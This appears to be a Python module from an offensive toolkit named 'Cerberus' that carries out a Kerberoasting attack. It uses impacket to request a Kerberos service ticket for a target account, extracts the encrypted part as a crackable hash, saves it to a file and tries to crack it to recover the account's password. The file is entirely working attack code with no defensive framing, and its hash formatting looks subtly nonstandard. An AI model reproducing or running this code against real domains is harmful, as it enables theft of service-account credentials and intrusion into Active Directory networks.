#!/usr/bin/env python3
"""
Kerberoasting module for Cerberus
"""

import os
import tempfile
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal
from core.utils import print_status, print_success, print_error, random_delay, write_to_file
from modules.cracker import CrackEngine

class Kerberoaster:
    def __init__(self, domain, username, password, dc_ip, lmhash="", nthash=""):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.lmhash = lmhash
        self.nthash = nthash
        self.cracker = CrackEngine()
        
    def attack(self, target_user):
        """Perform Kerberoasting attack on a target user"""
        print_status(f"Attempting Kerberoasting attack on {target_user}")
        
        try:
            # Get TGT for current user
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                self.username, 
                self.password, 
                self.domain, 
                self.lmhash, 
                self.nthash, 
                self.dc_ip
            )
            
            # Request TGS for the target service
            server_name = Principal(target_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                server_name, 
                self.domain, 
                self.dc_ip, 
                tgt, 
                cipher, 
                sessionKey
            )
            
            # Extract the encrypted part for cracking
            encrypted_data = tgs['ticket']['enc-part']['cipher']
            
            # Format the hash for cracking (Kerberos 5 TGS-REP etype 23)
            hash_string = f"$krb5tgs$23${target_user}${self.domain}${target_user}${encrypted_data.hex()}"
            
            # Save hash to file
            hash_file = write_to_file(f"kerberoast_{target_user}.hash", hash_string)
            print_success(f"Kerberos hash saved to: {hash_file}")
            
            # Attempt to crack the hash
            print_status(f"Attempting to crack hash for {target_user}")
            cracked_password = self.cracker.crack_hash(hash_string, "kerberos")
            
            if cracked_password:
                print_success(f"Successfully cracked password for {target_user}: {cracked_password}")
                return cracked_password
            else:
                print_error(f"Failed to crack password for {target_user}")
                return None
                
        except Exception as e:
            print_error(f"Kerberoasting attack failed: {str(e)}")
            return None